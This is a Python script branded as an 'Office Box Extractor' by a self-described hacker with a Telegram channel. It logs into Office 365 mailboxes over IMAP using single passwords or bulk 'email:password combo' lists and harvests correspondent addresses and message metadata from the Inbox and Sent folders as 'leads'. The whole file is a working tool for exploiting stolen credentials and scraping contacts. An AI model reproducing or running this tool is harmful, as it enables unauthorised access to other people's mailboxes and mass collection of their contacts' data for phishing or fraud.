import imaplib
import email
from email.header import decode_header
from termcolor import colored
import os

os.system('cls')

def show_banner():
    print(colored("""

                        ██╗  ██╗ ██████╗ ██╗  ██╗   ██╗██████╗  ██████╗ ██╗██╗
                        ██║  ██║██╔═══██╗██║  ╚██╗ ██╔╝██╔══██╗██╔═══██╗██║██║
                        ███████║██║   ██║██║   ╚████╔╝ ██████╔╝██║   ██║██║██║
                        ██╔══██║██║   ██║██║    ╚██╔╝  ██╔══██╗██║   ██║██║██║
                        ██║  ██║╚██████╔╝███████╗██║   ██████╔╝╚██████╔╝██║██║
                        ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═════╝  ╚═════╝ ╚═╝╚═╝
                                                                              
                                                         
                    Office Box Extractor By Holyboii: Contact me on Telegram @holyboii
                             Telegram channel: https://t.me/TheHackLegendTeam
                            
    This tool simply extracts leads and information from both the inbox and sent folder of a person or company.
""", 'green'))

def decode_email_header(header):
    decoded_header = decode_header(header)
    decoded_text = ""
    for part, encoding in decoded_header:
        try:
            if isinstance(part, bytes):
                decoded_text += part.decode(encoding or 'utf-8', errors='replace')
            else:
                decoded_text += part
        except LookupError:
            decoded_text += str(part)
    return decoded_text

def extract_emails_from_folder(imap_server, folder_name, email_type):
    imap_server.select(folder_name)
    sender_emails = []
    status, data = imap_server.search(None, 'ALL')
    if status == 'OK':
        for email_id in data[0].split():
            status, email_data = imap_server.fetch(email_id, '(RFC822)')
            if status == 'OK':
                raw_email = email_data[0][1]
                msg = email.message_from_bytes(raw_email)
                if email_type == 'sender':
                    email_address = decode_email_header(msg['From'])
                    print(f'{email_type.capitalize()} email address: {colored(str(email_address), "green")}')
                    sender_emails.append(email_address)
                    with open("box_sender_emails.txt", "a", encoding='utf-8') as file:
                        parts = email_address.split('<')
                        if len(parts) == 2:
                            file.write(parts[1].strip().rstrip('>') + "\n")
                        else:
                            file.write(email_address.strip() + "\n")
                else:
                    to_addresses = msg.get_all('To', [])
                    cc_addresses = msg.get_all('Cc', [])
                    bcc_addresses = msg.get_all('Bcc', [])
                    recipient_emails = to_addresses + cc_addresses + bcc_addresses
                    for email_address in recipient_emails:
                        print(f'Recipient email address: {colored(str(email_address), "green")}')
                        with open("box_recipient_emails.txt", "a", encoding='utf-8') as file:
                            parts = email_address.split('<')
                            if len(parts) == 2:
                                file.write(parts[1].strip().rstrip('>') + "\n")
                            else:
                                file.write(email_address.strip() + "\n")

    return sender_emails


def extract__box_email_addresses(email_address, password):
    imap_server = imaplib.IMAP4_SSL('outlook.office365.com')
    imap_server.login(email_address, password)
    folders = ['Inbox', 'Sent']
    sender_emails = []
    for folder in folders:
        print()
        print(colored(f'Extracting email addresses from {folder}...', 'yellow'))
        sender_emails_folder = extract_emails_from_folder(imap_server, folder, 'sender')
        sender_emails.extend(sender_emails_folder)
    imap_server.close()
    imap_server.logout()

    with open("box_sender_emails.txt", "a", encoding='utf-8') as file:
        for email_address in sender_emails:
            parts = email_address.split('<')
            if len(parts) == 2:
                file.write(parts[1].strip().rstrip('>') + "\n")
            else:
                file.write(email_address.strip() + "\n")

    print(colored('Sender email addresses extracted and saved to box_sender_emails.txt', 'cyan'))

def extract_box_info(username, password):
    imap_server = imaplib.IMAP4_SSL('outlook.office365.com')
    imap_server.login(username, password)

    status, mailbox_list = imap_server.list()
    if status == 'OK':
        for item in mailbox_list:
            _, mailbox_name = item.decode().split(' "/" ')
            if mailbox_name in ['Inbox', 'Sent']:
                print()
                print('Extracting info from: ' + colored(f'{mailbox_name} folder...', 'yellow'))
                imap_server.select(mailbox_name)
                status, data = imap_server.search(None, 'ALL')
                if status == 'OK':
                    for email_id in data[0].split():
                        status, email_data = imap_server.fetch(email_id, '(RFC822)')
                        if status == 'OK':
                            raw_email = email_data[0][1]
                            msg = email.message_from_bytes(raw_email)
                            email_subject = decode_email_header(msg['Subject'])
                            email_from = decode_email_header(msg['From'])
                            email_to = decode_email_header(msg['To'])
                            email_date = msg['Date']
                            email_type = "Inbox" if mailbox_name == 'Inbox' else "Sent"
                            print(f"Type:" + colored(f'{email_type}', 'yellow'))
                            print(f"From Name:" + colored(f'{email_from}', 'green'))
                            print(f"To:" + colored(f'{email_to}', 'green'))
                            print(f"Subject:" + colored(f'{email_subject}', 'green'))
                            print(f"Date:" + colored(f'{email_date}', 'green'))
                            print("Successfully Capture Info.")
                            print("-" * 50)
                            email_info = f"Type: {email_type}\nFrom: {email_from}\nTo: {email_to}\nSubject: {email_subject}\nDate: {email_date}\n"
                            with open("export_emails_info.txt", "a", encoding='utf-8') as file:
                                file.write(email_info + "\n" + "-" * 50 + "\n")

    imap_server.close()
    imap_server.logout()

    print(colored('Emails extracted and saved to "export_emails_info.txt"', 'cyan'))



def main():
    show_banner()

    print("Please select a service:")
    print("1. Extract Box Leads")
    print("2. Extract Box Info")
    print("3. Exit")

    while True:
        choice = input("Enter your choice (1-3): ")
        if choice == '1':
            print("You selected: Extract Box Leads")
            profile_type = input("Enter 'S' for single profile or 'M' for multiple profiles: ").upper()
            if profile_type == 'S':
                email_address = input("Enter your email address: ")
                password = input("Enter your password: ")
                extract__box_email_addresses(email_address, password)
            elif profile_type == 'M':
                file_path = input("Enter the path to the file containing email:password combos: e.g filename.txt: ")
                if os.path.isfile(file_path):
                    with open(file_path, 'r') as file:
                        combos = file.readlines()
                    for combo in combos:
                        email, password = combo.strip().split(':')
                        extract__box_email_addresses(email, password)
                else:
                    print("Invalid file path.")
        elif choice == '2':
            print("You selected: Extract Box Info.")
            profile_type = input("Enter 'S' for single profile or 'M' for multiple profiles: ").upper()
            if profile_type == 'S':
                email_address = input("Enter your email address: ")
                password = input("Enter your password: ")
                extract_box_info(email_address, password)
            elif profile_type == 'M':
                file_path = input("Enter the path to the file containing email:password combos: e.g filename.txt: ")
                if os.path.isfile(file_path):
                    with open(file_path, 'r') as file:
                        combos = file.readlines()
                    for combo in combos:
                        email, password = combo.strip().split(':')
                        extract_box_info(email, password)
                else:
                    print("Invalid file path.")
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print(colored('Invalid choice. Please enter a number between 1 and 3.', 'red'))


if __name__ == "__main__":
    main()
